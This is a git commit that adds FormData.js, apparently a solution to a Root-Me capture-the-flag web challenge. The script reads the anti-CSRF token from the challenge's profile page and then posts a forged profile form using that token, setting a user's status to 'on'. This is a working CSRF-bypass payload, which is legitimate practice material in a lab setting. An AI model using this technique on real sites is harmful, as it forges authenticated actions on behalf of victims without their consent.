c3ecbd09f11fd9a49fcf063294968ff17813ebf0
ispomael <ispomael@gmail.com>
2025-07-30 16:55:23 +0200

    Create FormData.js

---
+++ FormData.js
@@ -0,0 +1,16 @@
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','http://challenge01.root-me.org/web-client/ch23/index.php?action=profile',true);
+req.send();
+function handleResponse() {
+    var tokena = this.responseText.match(/name="token" value="(\w+)"/)[1];
+
+    var formData = new FormData();
+    formData.append('username', 'mds');
+    formData.append('status', 'on');
+    formData.append('token', tokena);
+
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', true);
+    changeReq.send(formData);
+};
